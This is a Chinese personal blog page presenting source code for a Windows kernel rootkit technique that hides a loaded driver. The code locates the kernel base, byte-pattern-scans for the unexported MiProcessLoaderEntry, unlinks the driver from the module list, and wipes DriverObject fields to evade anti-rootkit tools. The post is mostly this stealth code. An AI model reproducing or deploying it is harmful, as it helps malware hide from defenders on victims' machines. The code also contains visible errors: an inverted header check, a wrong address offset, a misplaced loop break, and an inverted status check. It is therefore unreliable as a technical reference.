@@ -1,0 +1,165 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="简易的驱动隐藏技术"><meta name="keywords" content="kernel"><meta name="author" content="Disp41r"><meta name="copyright" content="Disp41r"><title>简易的驱动隐藏技术 | ^^</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  }
+} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#简易的驱动隐藏技术"><span class="toc-number">1.</span> <span class="toc-text">简易的驱动隐藏技术</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Disp41r</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">15</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">6</span></a></div></div></div><div id="content-outer"><div class="no-bg" id="top-container"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">^^</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">简易的驱动隐藏技术</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-05-03</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h2 id="简易的驱动隐藏技术"><a href="#简易的驱动隐藏技术" class="headerlink" title="简易的驱动隐藏技术"></a><center>简易的驱动隐藏技术</center></h2><p>第一次写rootkit驱动，思路来自于猪会被杀掉大佬（<a href="https://blog.csdn.net/zhuhuibeishadiao/article/details/75658816）" target="_blank" rel="noopener">https://blog.csdn.net/zhuhuibeishadiao/article/details/75658816）</a><a id="more"></a>，核心代码分成两部分，一部分主要是实现驱动装载时，在把驱动的相关信息写入内核模块链表时摘除，使用MiRrocessLoaderEntry这个未公开的API（主要难点就在获取他的地址，没法使用MmGetSystemRoutineAddress),第二部分主要就是抹除分配的driverObject的一些特征（比如DriverUnload之类的，需要设置为Null）。<br>这里想要获得地址主要采用去ntos中遍历的方式找到他，那么首先，我们需要获得ntos在内存中加载的基址</p>
+<pre><code>PVOID  UtilKernelBase(OUT PULONG pSize) {
+    //因为要获得的链表的是在ntos里的，所以需要我们去ntos中遍历他们
+    NTSTATUS status;
+    ULONG bytes = 0;
+    PRTL_PROCESS_MODULES pMods = 0;
+    PVOID checkPtr = 0;
+    UNICODE_STRING routineName;//这里随机选择一个ntos里的导出函数即可
+
+    if (g_KernelBase != 0) {
+        if (pSize) {
+            *pSize = (ULONG)g_KernelBase;
+            return g_KernelBase;
+        }
+    }
+    RtlInitUnicodeString(&amp;routineName, L&quot;NtCreateFile&quot;);
+    checkPtr = MmGetSystemRoutineAddress(&amp;routineName);//去寻找这个导出函数在内存中的地址
+    if (checkPtr == 0) {
+        return 0;
+    }
+    __try {
+        status = ZwQuerySystemInformation(SystemModuleInformation, 0, bytes, &amp;bytes);//获得SystemInformation这个重要结构体
+        if (bytes == 0) {
+            DbgPrint(&quot;Invalid SystemModuleInformation size\n&quot;);
+            return 0;
+        }
+        pMods = (PRTL_PROCESS_MODULES)ExAllocatePoolWithTag(NonPagedPoolNx, bytes, HB_POOL_TAG);
+        RtlZeroMemory(pMods, bytes);//释放空间
+
+        status = ZwQuerySystemInformation(SystemModuleInformation, pMods, bytes, &amp;bytes);//查询系统信息可以获取到进程列表，遍历每一个进程
+        if (NT_SUCCESS(status)) {
+            PRTL_PROCESS_MODULE_INFORMATION  pMod = pMods-&gt;Modules;//这个结构体中保存了进程的很多信息，包括节区和基址
+            for (ULONG i = 0; i &lt; pMods-&gt;NumberOfModules; i++) {
+                if (checkPtr &gt;= pMod[i].ImageBase&amp;&amp;checkPtr &lt; (PVOID)((PUCHAR)pMod[i].ImageBase + pMod[i].ImageSize)) {//遍历进程中每一个进程的基址
+                    g_KernelBase = pMod[i].ImageBase;//获得每一个进程的基址，判断刚刚的那个函数是否在刚刚遍历到的进程的地址范围之中
+                    g_KernelSize = pMod[i].ImageSize;
+                }
+                if (pSize)
+                    *pSize = g_KernelSize;
+                break;
+            }
+        }
+    }
+    __except(EXCEPTION_EXECUTE_HANDLER) {
+        DbgPrint(&quot;search error2\n&quot;);
+        return (PVOID)STATUS_UNHANDLED_EXCEPTION;
+    }
+    return (PVOID)STATUS_NOT_FOUND;
+
+}//获得ntos这个模块在内存中加载的地址
+</code></pre><p>主要还是通过ntos的导出函数去获得SystemModuleInformation，从而得到进程列表，判断你选择的导出函数地址是否在你获得的范围之中，知道ntos基址后，就可以进行下一步搜索，去ntos里根据这个函数的特诊去Section里搜索，并找出他的内存管地址并保存，方便调用，ok，上windbg保存下这个函数的特征(我的为win7 x86)</p>
+<p><img src="https://s1.ax1x.com/2018/12/03/FMsHER.png" alt=""></p>
+<p>然后在内存里搜索时就可以根据这些特征去搜索</p>
+<pre><code>NTSTATUS UtilSearchPattern(IN PCUCHAR pattern, IN UCHAR wildcard, IN ULONG_PTR len, IN const VOID* base, IN ULONG_PTR size, OUT PVOID* ppFound) {
+    //这个函数是根据传入的特征字符串去搜索
+    NT_ASSERT(ppFound != 0 &amp;&amp; pattern != 0 &amp;&amp; base != 0);
+    if (ppFound == 0 || pattern == 0 || base == 0) {
+        return STATUS_INVALID_PARAMETER;
+    }
+    __try {
+        for (ULONG_PTR i = 0; i &lt; size - len; i++) {
+            BOOLEAN found = TRUE;
+            for (ULONG_PTR j = 0; j &lt; len; j++) {
+                if (pattern[j] != wildcard &amp;&amp; pattern[j] != ((PCUCHAR)base)[i + j]) {//根据传入的特征串指针找到目标函数地址
+                    DbgPrint(&quot;search error1\n&quot;);
+                    found = FALSE;
+                    break;
+                }
+            }
+            if (found != FALSE) {
+                *ppFound = (PUCHAR)base + 1;
+                DbgPrint(&quot;find addr:%p\n&quot;,(PUCHAR)base+1);
+                return STATUS_SUCCESS;
+            }
+        }
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER) {
+        DbgPrint(&quot;search error2\n&quot;);
+        return STATUS_UNHANDLED_EXCEPTION;
+    }
+}
+
+NTSTATUS UtilScanSection(IN PCCHAR section, IN PCUCHAR pattern, IN UCHAR wildcard, IN ULONG_PTR len, OUT PVOID* ppFound) {
+    //这个函数是对节区的扫描
+    NT_ASSERT(ppFound != 0);
+    if (ppFound == 0)
+        return STATUS_INVALID_PARAMETER;
+    PVOID base = UtilKernelBase(0);
+    if (!base)
+        return STATUS_NOT_FOUND;
+
+    PIMAGE_NT_HEADERS64 pHdr =(PIMAGE_NT_HEADERS64)RtlImageNtHeader(base);
+    //根据之前寻到的基址去解析这个ntos的pe文件结构以及导出函数
+    if (pHdr)
+        return STATUS_INVALID_IMAGE_FORMAT;
+    //通过pe头获得节区的数目和每个节区
+    PIMAGE_SECTION_HEADER pFirstSection = (PIMAGE_SECTION_HEADER)(pHdr + 1);
+    for (PIMAGE_SECTION_HEADER pSection = pFirstSection; pSection &lt; pFirstSection + pHdr-&gt;FileHeader.NumberOfSections; pSection++) {
+        ANSI_STRING s1, s2;
+        RtlInitAnsiString(&amp;s1, section);
+        RtlInitAnsiString(&amp;s2, (PCCHAR)pSection-&gt;Name);//通过的是对比节区名字
+        if (RtlCompareString(&amp;s1, &amp;s2, TRUE) == 0) {
+            return UtilSearchPattern(pattern, wildcard, len, (PUCHAR)base + pSection-&gt;VirtualAddress, pSection-&gt;Misc.VirtualSize, ppFound);
+        }//找到对应的节区之后，在节区里爆搜
+        return STATUS_NOT_FOUND;
+    }
+}
+</code></pre><p>ok，现在需要的搜索函数已经全了，只要综合调用下就ok了，并且在执行摘链过程之后需要抹除driver的一些特征哈</p>
+<pre><code>VOID _fastcall HideDriver(PVOID x) {
+    PMiProcessLoaderEntry m_MiRrocessLoaderEntry = NULL;
+    PDRIVER_OBJECT driver = (PDRIVER_OBJECT)x;
+
+    LARGE_INTEGER SleepTime;//一般也只有时间会用到长整型
+    SleepTime.QuadPart = -20000;
+    while (1) {
+        if (TempFlags)
+            break;
+        KeDelayExecutionThread(KernelMode, 0, &amp;SleepTime);//延迟执行防止出现操作系统的阻塞
+    }
+    KeDelayExecutionThread(KernelMode, 0, &amp;SleepTime);
+
+    CHAR pattern[] = &quot;\x48\x89\x5c\x24\x08\x48\x89\x6c\x24\x18\x48\x89\x74\x24\x20\x57\x41\x54\x41\x55\x41\x56\x57\x48\x83\xec\x30\x30\x48\x8b\xf9\x44\x8b\xf2&quot;;
+    int sz = sizeof(pattern) - 1;//减一是因为有个&apos;\0&apos;
+    DbgPrint(&quot;sz:%d\n&quot;, sz);
+
+    //执行搜索 操作，唯一的目的是把那个未导出函数的地址获得
+    UtilScanSection(&quot;.text&quot;, (PCUCHAR)pattern, 0xCC, sz, (PVOID *)&amp;MiProcessLoaderEntry1);
+    DbgPrint(&quot;%p\n&quot;, MiProcessLoaderEntry1);
+
+    m_MiRrocessLoaderEntry = (PMiProcessLoaderEntry)MiProcessLoaderEntry1;
+    m_MiRrocessLoaderEntry((PKLDR_DATA_TABLE_ENTRY)driver-&gt;DriverSection, 0);
+    //在执行了摘链操作后，只需要进行一系列的特征抹除(此操作必须写在多线程里)，否则可能未执行特征已被抹除从而导致
+    driver-&gt;DriverSection = NULL;
+    driver-&gt;DriverStart = NULL;
+    driver-&gt;DriverSize = NULL;
+    driver-&gt;DriverUnload = NULL;
+    PsTerminateSystemThread(STATUS_SUCCESS);
+}
+</code></pre><p>最后就是创建DriverEntry以及调用啦~（不写在多线程里真的会蓝屏哦），这里需要导入的有SystemModuleInformation这个结构，还有必要的一些PE结构（解析文件时使用），都写在头文件里辣，太长了就不贴，当然还有最重要的MiProcessLoaderEntry这个函数的调用原型</p>
+<pre><code>NTSTATUS DriverEntry(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path) {
+    driver-&gt;DriverUnload =(PDRIVER_UNLOAD) UnLoad;
+    HANDLE hThread;
+    NTSTATUS status = PsCreateSystemThread(&amp;hThread, 0, NULL, NULL, NULL, (PKSTART_ROUTINE)HideDriver, (PVOID)driver);
+    if (NT_SUCCESS(status)) {
+        DbgPrint(&quot;创建线程失败\n&quot;);
+    }
+    ZwClose(hThread);
+    TempFlags = TRUE;
+    return STATUS_SUCCESS;
+}
+</code></pre><p>不过这个方法被空开之后一般的ARK工具应该已经做出了相应的对策，所以感觉也只能过老版本的xuetr了</p>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Disp41r</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://yoursite.com/2020/05/03/%E7%AE%80%E6%98%93%E7%9A%84%E9%A9%B1%E5%8A%A8%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF/">http://yoursite.com/2020/05/03/%E7%AE%80%E6%98%93%E7%9A%84%E9%A9%B1%E5%8A%A8%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/kernel/">kernel</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/05/03/%E6%9F%90%E5%85%A5%E7%BE%A4%E9%A2%98-%E5%AE%89%E5%8D%93/"><i class="fa fa-chevron-left">  </i><span>某入群题 安卓</span></a></div><div class="next-post pull-right"><a href="/2020/05/03/%E9%A9%B1%E5%8A%A8%E7%BB%83%E4%B9%A0%EF%BC%9A%E9%A9%B1%E5%8A%A8%E7%BA%A7%E5%8F%98%E9%80%9F%E4%BB%A5%E5%8F%8A%E4%B8%A4%E7%A7%8D%E9%94%AE%E7%9B%98%E8%BF%87%E6%BB%A4%E9%92%A9%E5%AD%90/"><span>驱动练习：驱动级变速以及两种键盘过滤钩子~</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2020 By Disp41r</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+  $('#top-container').addClass('is-mobile')
+}</script></body></html>
